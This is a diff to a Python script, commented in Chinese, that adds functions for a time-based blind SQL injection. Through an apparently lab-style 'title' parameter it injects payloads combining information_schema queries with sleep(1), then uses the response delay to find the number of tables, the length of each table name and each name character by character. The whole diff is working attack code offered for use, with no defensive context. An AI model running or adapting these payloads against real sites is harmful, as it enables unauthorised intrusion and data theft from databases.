@@ -39,5 +39,50 @@ def get_database_name(count):
                 print(chr(j), end="")
 
 
+#  获取当前数据库表的个数
+def get_table_count() -> int:
+    count = 0
+    for i in range(100):
+        url = BASE_URL + "?title=Iron Man' and (select count(table_name) from information_schema.TABLES where TABLE_SCHEMA = database()) = {} and sleep(1) --+".format(
+            i)
+        start_time = time.time()
+        resp = requests.get(url, headers=HEADER)
+        # print(resp.content)
+        if time.time() - start_time > 1:
+            print("表个数为{}".format(i))
+            count = i
+            return count
+
+
+# 获取当前数据库 所有表 名字的长度
+def get_table_length_of_each_table(count):
+    for i in range(0, count + 1):
+        for j in range(100):
+            url = BASE_URL + "?title=Iron Man' and (select length(table_name) from information_schema.TABLES where TABLE_SCHEMA = database() limit {},1) = {} and sleep(1) --+".format(
+                i, j)
+            start_time = time.time()
+            resp = requests.get(url, headers=HEADER)
+            # print(resp.content)
+            if time.time() - start_time > 1:
+                print("表{}长度为{}".format(i, j))
+                get_table_name_of_each_table(i, j)
+                continue
+
+
+def get_table_name_of_each_table(index, count):
+    for i in range(count + 1):
+        for j in range(33, 127):
+            url = BASE_URL + "?title=Iron Man' and ascii(substr((select table_name from information_schema.tables where table_schema = database() limit {},1),{},1)) = {} and sleep(1) --+".format(
+                index, i, j)
+            start_time = time.time()
+            resp = requests.get(url, headers=HEADER)
+            if time.time() - start_time > 1:
+                print(chr(j), end="")
+    print("\n")
+
+
 # get_database_name_length()
-get_database_name(get_database_name_length())
+# get_database_name(get_database_name_length())
+
+# get_table_count()
+get_table_length_of_each_table(get_table_count())
